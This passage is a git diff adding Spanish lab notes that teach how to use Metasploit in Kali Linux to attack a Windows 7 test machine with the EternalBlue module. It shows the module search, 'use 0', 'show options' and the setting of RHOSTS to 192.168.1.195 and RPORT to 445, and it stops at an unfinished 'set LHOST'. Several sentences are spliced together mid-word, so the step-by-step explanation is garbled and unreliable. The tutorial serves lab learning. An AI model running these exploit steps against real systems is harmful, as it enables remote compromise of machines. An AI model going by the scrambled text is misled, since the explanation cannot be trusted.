@@ -371,3 +371,52 @@ Este comando nos proporcionará información detallada sobre el servicio SNMP en
 ## Explotación de Vulnerabilidades y Ataques de Fuerza Bruta
 ---
 
+En este apartado, Mario nos enseña usar Metasploit para explotar vulnerabilidades y realizar ataques de fuerza bruta.
+
+para esto nos explica que en la máquina kali Linux debemos acceder por la aplicación de Metasploit hacerlo desde el menu de la pantalla principal para que cargue la Base de datos
+Despues de esto vamos a explotar la máquina Windows 7 de la que ya hemos hablado anteriormente.
+
+![Iniciar programa Metasploit](img/Metasploit.png)
+
+```bash
+search eternalblue
+```
+
+![Comando Eternalblue](img/comandoEternalblue.png)
+
+Este comando busca en Metasploit módulos relacionados con la vulnerabilidad EternalBlue, que afecta a sistemas Windows y permite la ejecución remota de código.
+
+Debemos saber que tambien podemos buscar por CVE.
+
+![Comando use 0](img/comandoCVE.png)
+
+si queremos usar el exploit 0 usaremos el comando 
+
+```bash	
+use 0 
+```
+despues podemos usar el comando:
+
+```bash
+show options
+```
+![Comando use 0](img/comandouse0.png)
+
+Este comando muestigurar los parámetros necesarios para el exploit. Por ejemplo, podemos establecer la dirección IP del objetivo y el puerto.
+
+Mario nos explica que existe el exploit y dentro del exploit está el payload.
+
+una vez que el exploit haya entrado en la mra las opciones disponibles para el módulo seleccionado, incluyendo los parámetros que debemos configurar antes de ejecutar el exploit.
+Luego, debemos confáquina víctima, podemos ejecutar el payload.
+
+una vez entendio esto, podemos configurar los parámetros necesarios para el exploit. Por ejemplo, podemos establecer la dirección IP del objetivo y el puerto.
+
+```bash	
+set RHOSTS 192.168.1.195
+```
+```bash
+set RPORT 445
+```
+```bash
+set LHOST
+
